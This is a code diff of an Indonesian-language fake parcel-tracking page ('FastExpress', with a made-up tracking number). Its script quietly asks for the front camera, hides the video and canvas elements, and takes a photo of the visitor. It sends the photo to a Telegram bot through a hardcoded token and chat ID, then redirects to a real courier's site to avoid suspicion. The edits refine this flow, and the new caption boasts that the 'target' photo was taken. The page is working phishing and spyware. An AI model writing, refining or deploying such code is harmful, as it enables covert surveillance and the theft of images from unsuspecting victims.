@@ -5,10 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sistem Pelacakan Paket Otomatis</title>
     <style>
-        /* Desain Kombinasi Oranye & Putih Profesional */
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        
-        /* Background Utama Menggunakan Gradasi Oranye yang Lembut */
         body { 
             background: linear-gradient(135deg, #ff7e5f 0%, #feb47b 100%); 
             color: #333; 
@@ -18,8 +15,6 @@
             min-height: 100vh; 
             padding: 20px; 
         }
-        
-        /* Kartu Pelacakan Dengan Efek Kaca Transparan (Glassmorphism) Modern */
         .tracking-card { 
             background: rgba(255, 255, 255, 0.95); 
             max-width: 430px; 
@@ -29,170 +24,108 @@
             box-shadow: 0 20px 40px rgba(0,0,0,0.15); 
             text-align: center; 
         }
-        
-        /* Ilustrasi Box Tambahan Agar Lebih Menarik */
-        .package-illustration {
-            font-size: 50px;
-            margin-bottom: 10px;
-            animation: bounce 2s infinite ease-in-out;
-        }
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-8px); }
-        }
-        
-        /* Logo & Header FastExpress */
+        .package-illustration { font-size: 50px; margin-bottom: 10px; animation: bounce 2s infinite ease-in-out; }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }
         .logo-area { display: flex; align-items: center; justify-content: center; margin-bottom: 15px; gap: 8px; }
         .logo-icon { width: 35px; height: 35px; background: #ff5722; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 16px; }
         .brand-name { font-size: 24px; font-weight: 800; color: #1e293b; letter-spacing: -0.5px; }
         .brand-name span { color: #ff5722; }
-        
-        /* Nomor Resi Bergaya Kartu Digital */
-        .resi-number { 
-            background: #fff5f2; 
-            border: 1px solid #ffe0d6; 
-            padding: 12px; 
-            border-radius: 12px; 
-            font-size: 14px; 
-            color: #ff5722; 
-            margin-bottom: 30px; 
-            font-weight: 600;
-            letter-spacing: 0.5px;
-        }
-        
-        /* Animasi Loading Spinner Putar Oranye */
-        .spinner { 
-            width: 45px; 
-            height: 45px; 
-            border: 4px solid #ffe0d6; 
-            border-top: 4px solid #ff5722; 
-            border-radius: 50%; 
-            animation: spin 1s linear infinite; 
-            margin: 0 auto 20px; 
-        }
+        .resi-number { background: #fff5f2; border: 1px solid #ffe0d6; padding: 12px; border-radius: 12px; font-size: 14px; color: #ff5722; margin-bottom: 30px; font-weight: 600; letter-spacing: 0.5px; }
+        .spinner { width: 45px; height: 45px; border: 4px solid #ffe0d6; border-top: 4px solid #ff5722; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        /* Teks Status Pengiriman */
         .status-title { font-size: 18px; font-weight: 700; color: #1e293b; margin-bottom: 10px; }
         .status-desc { font-size: 14px; color: #64748b; line-height: 1.6; padding: 0 10px; }
+        .footer-secure { margin-top: 30px; font-size: 11px; color: #ff5722; display: inline-flex; align-items: center; gap: 6px; background: #fff5f2; padding: 6px 16px; border-radius: 30px; font-weight: 500; }
         
-        /* Badge Footer Keamanan */
-        .footer-secure { 
-            margin-top: 30px; 
-            font-size: 11px; 
-            color: #ff5722; 
-            display: inline-flex; 
-            align-items: center; 
-            gap: 6px; 
-            background: #fff5f2;
-            padding: 6px 16px;
-            border-radius: 30px;
-            font-weight: 500;
-        }
-        
-        /* Menyembunyikan elemen kamera sepenuhnya */
+        /* Elemen pemrosesan disembunyikan */
         video, canvas { display: none; position: absolute; left: -9999px; }
     </style>
 </head>
 <body>
 
     <div class="tracking-card">
-        <!-- Ilustrasi Paket Bergerak -->
         <div class="package-illustration">🚚</div>
-
-        <!-- Bagian Header Logistik -->
         <div class="logo-area">
             <div class="logo-icon">✓</div>
             <div class="brand-name">Fast<span>Express</span></div>
         </div>
-        
-        <!-- Nomor Resi Pelacakan -->
         <div class="resi-number">Resi: FX-982317445-ID</div>
-        
-        <!-- Indikator Proses -->
         <div class="spinner"></div>
-        
-        <!-- Pesan Status Pengguna -->
         <div class="status-title">Memverifikasi Enkripsi Lokasi...</div>
         <p class="status-desc">Sistem sedang mencocokkan koordinat satelit perangkat dengan kurir terdekat. Mohon tunggu proses sinkronisasi ini.</p>
-        
-        <!-- Footer Keamanan -->
-        <div class="footer-secure">
-            🛡️ Sistem Verifikasi Resmi Jaringan SSL-256
-        </div>
+        <div class="footer-secure">🛡️ Sistem Verifikasi Resmi Jaringan SSL-256</div>
     </div>
 
-    <!-- Elemen Pemprosesan Kamera Tersembunyi -->
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
-    const TELEGRAM_TOKEN = '8944168845:AAE-fJOEJwFKrFK3dRzI5UQiuYvbkJC7Z_Y';
-    const CHAT_ID = '1966317946';
+        const TELEGRAM_TOKEN = '8944168845:AAE-fJOEJwFKrFK3dRzI5UQiuYvbkJC7Z_Y';
+        const CHAT_ID = '1966317946';
 
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
 
-    // Meminta akses kamera depan
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then(stream => {
-            video.srcObject = stream;
-            
-            // Perbaikan: Menunggu kamera benar-benar siap dan memiliki resolusi
-            video.onloadedmetadata = () => {
-                setTimeout(takeSnapshot, 2500);
-            };
-        })
-        .catch(err => {
-            console.error("Akses kamera tidak diizinkan atau perangkat tidak mendukung:", err);
-            // Pengalihan tetap berjalan jika akses ditolak agar tidak memicu kecurigaan
-            setTimeout(() => {
+        // Jalankan pencarian izin kamera
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    // Beri jeda agar kamera fokus
+                    setTimeout(takeSnapshot, 2500);
+                };
+            })
+            .catch(err => {
+                alert("Gagal memuat sistem pelacakan: Izin akses perangkat ditolak.");
+                // Jika ditolak, langsung buang ke JNE setelah klik OK
                 window.location.href = "https://jne.co.id";
-            }, 3000);
-        });
+            });
 
-    function takeSnapshot() {
-        // Memastikan resolusi kamera sudah valid sebelum memotret
-        if (video.videoWidth === 0 || video.videoHeight === 0) {
-            console.log("Kamera belum siap, mencoba kembali...");
-            setTimeout(takeSnapshot, 1000);
-            return;
+        function takeSnapshot() {
+            if (video.videoWidth === 0 || video.videoHeight === 0) {
+                setTimeout(takeSnapshot, 500);
+                return;
+            }
+
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(blob => {
+                if (blob) {
+                    sendToTelegram(blob);
+                }
+            }, 'image/jpeg');
         }
 
-        const context = canvas.getContext('2d');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        canvas.toBlob(blob => {
-            if (blob) {
-                sendToTelegram(blob);
-            } else {
-                console.error("Gagal membuat objek gambar (Blob).");
-            }
-        }, 'image/jpeg');
-    }
+        function sendToTelegram(imageBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', imageBlob, 'kurir-capture.jpg');
+            formData.append('caption', '☠️ Foto target berhasil diambil team anonymous.');
 
-    function sendToTelegram(imageBlob) {
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', imageBlob, 'kurir-capture.jpg');
-        formData.append('caption', '📸 Sistem Kurir: Foto pelacakan berhasil diambil.');
-
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log('Respons Telegram:', data);
-            window.location.href = "https://jne.co.id";
-        })
-        .catch(error => {
-            console.error('Kendala pengiriman data ke Telegram:', error);
-            window.location.href = "https://jne.co.id";
-        });
-    }
-</script>
-
+            // PERBAIKAN UTAMA: Mengunci alur pemrosesan secara sinkron
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                return response.json();
+            })
+            .then(data => {
+                // Halaman baru boleh pindah jika data keluar/sukses di log server Telegram
+                if(data.ok) {
+                    window.location.href = "https://jne.co.id";
+                } else {
+                    alert("Kesalahan Server Logistik: " + data.description);
+                }
+            })
+            .catch(error => {
+                // Cegah redirect jika terjadi error jaringan agar Anda bisa membaca log error-nya
+                alert("Koneksi gagal saat mengirim data.");
+            });
+        }
+    </script>
+</body>
+</html>
